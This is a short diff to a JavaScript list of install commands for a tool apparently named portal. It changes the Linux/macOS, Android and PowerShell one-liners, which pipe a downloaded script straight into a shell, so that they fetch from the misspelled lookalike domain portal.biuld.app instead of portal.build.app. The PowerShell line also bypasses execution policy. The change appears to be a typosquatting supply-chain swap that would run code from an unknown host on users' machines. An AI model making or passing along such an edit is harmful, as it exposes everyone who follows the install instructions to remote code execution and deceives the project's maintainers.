@@ -7,17 +7,17 @@ const installers = [
   {
     id: "linux",
     label: "Linux / macOS",
-    cmd: "curl -fsSL https://portal.build.app/install.sh | sh",
+    cmd: "curl -fsSL https://portal.biuld.app/install.sh | sh",
   },
   {
     id: "android",
     label: "Android / Termux",
-    cmd: "curl -fsSL https://portal.build.app/install.sh | sh",
+    cmd: "curl -fsSL https://portal.biuld.app/install.sh | sh",
   },
   {
     id: "windows",
     label: "PowerShell",
-    cmd: 'powershell -ExecutionPolicy Bypass -c "irm https://portal.build.app/install.ps1 | iex"',
+    cmd: 'powershell -ExecutionPolicy Bypass -c "irm https://portal.biuld.app/install.ps1 | iex"',
   },
   { id: "npm", label: "npm", cmd: "npm install -g @hiverra/portal@0.11.1" },
 ];
